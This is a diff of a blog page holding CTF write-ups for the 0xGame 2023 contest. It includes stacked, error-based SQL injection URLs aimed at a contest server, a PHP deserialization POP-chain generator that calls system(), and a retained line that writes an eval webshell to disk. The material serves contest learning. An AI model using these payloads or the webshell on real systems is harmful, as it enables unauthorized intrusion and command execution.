@@ -18,7 +18,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>0xGame-2023 |  n0rt6&#39;s bolg</title>
+      <title>0xGame-2023 |  n0rt6&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.jpg" />
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">346</span>
+            <span class="post-count">2.4k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">12 分钟</span>
         </span>
     </span>
 </div>
@@ -179,6 +179,448 @@
 <p><code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4=|base64$&#123;IFS&#125;-d&gt;&gt;513.php</code></p>
 </blockquote>
 <p>连接蚁剑拿到flag。<br><img src="https://img-blog.csdnimg.cn/f521f056cd724f2f8e85d9b2a945a12f.png" alt="1"></p>
+<h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h2><p>知识点：SQL注入（堆叠注入、报错注入、预处理）<br>提示：<br><img src="https://img-blog.csdnimg.cn/ea2dbfeb1c804919a79f91fb8cd2e71c.png" alt="1"><br>查看禁用函数,fuzz一下，发现以下字符被过滤。<br><img src="https://img-blog.csdnimg.cn/a575a24b97be4713ba7423ed92ff0f9e.png" alt="1"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇（updatexml extractvalue floor）</a></p>
+<p>借一位师傅的脚本</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
+
+<span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> Group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
+
+MySQLdb<span class="token punctuation">.</span>OperationalError: <span class="token punctuation">(</span><span class="token number">1105</span><span class="token punctuation">,</span> <span class="token string">"XPATH syntax error: '~~flag,userinfo'"</span><span class="token punctuation">)</span>
+
+
+
+<span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='flag')));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
+
+<span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>first_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>last_name<span class="token punctuation">)</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select flag from ctf.flag)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,substr((select flag from ctf.flag),29,30)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token number">0</span>xGame&#123;<span class="token number">4286</span>b62d<span class="token operator">-</span>c37e<span class="token operator">-</span><span class="token number">4010</span><span class="token operator">-</span>ba9c<span class="token operator">-</span><span class="token number">35</span>d47641fb91&#125;
+
+http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C737562737472282873656C65637420666C61672066726F6D206374662E666C6167292C32392C33302929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h2><p>考点：php反序列化pop链构造、wakeup的绕过。<br>不会，看的官方wp。。。<br><img src="https://img-blog.csdnimg.cn/4e1821de9476443b80fcf1ee06488bd7.png" alt="提示"><br>贴上源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先找到入口<code>__destruct()</code>，在<code>DataObject 类里</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里会遍历data的内容，将key和value赋值给storage，触发 Storage 的 <code>__set</code> 方法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里如果<code>$store</code>为空，那么就初始化一个空的array()，下一个if语句就是调用value的expire方法，如果返回false就将value放入store中。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在Cache类中expired方法会判断内部的expired属性是否为true，如果是，则会调用helper的clean方法，而clean发方法不存在，实际上就是调用<code>__call</code>方法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里<code>__call</code>会按照传入的name从func数组中去除对应的函数名，然后将args作为参数来调用这个函数，这里就是存在getshell的地方。<br>如果要到达最后的<code>__call</code>方法，需要让Cache类中的expired属性为true，但是Cache中会先触发wakeup方法，这就使得expired为false，需要先绕过wakeup方法<br>原来有个新生赛就有这个知识点，使用php引用的概念</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>这个时候b的值就等于a的值，b的值一旦改变，a的值也会跟着改变。a和b指向相同的内存地址</p>
+<p>我们可以让expired属性成为某个变量的引用，这样即使现在expired属性值为false，但是后面的过程中一旦改变引用变量的值，expired 属性值也会被改变，只要值不是null，就会绕过if判断。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'clean'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cache1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cache1</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cache2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
+<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$storage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$storage</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">;</span>
+
+<span class="token variable">$dataObject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key1'</span> <span class="token operator">=></span> <span class="token variable">$cache1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'key2'</span> <span class="token operator">=></span> <span class="token variable">$cache2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">storage</span> <span class="token operator">=</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$dataObject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
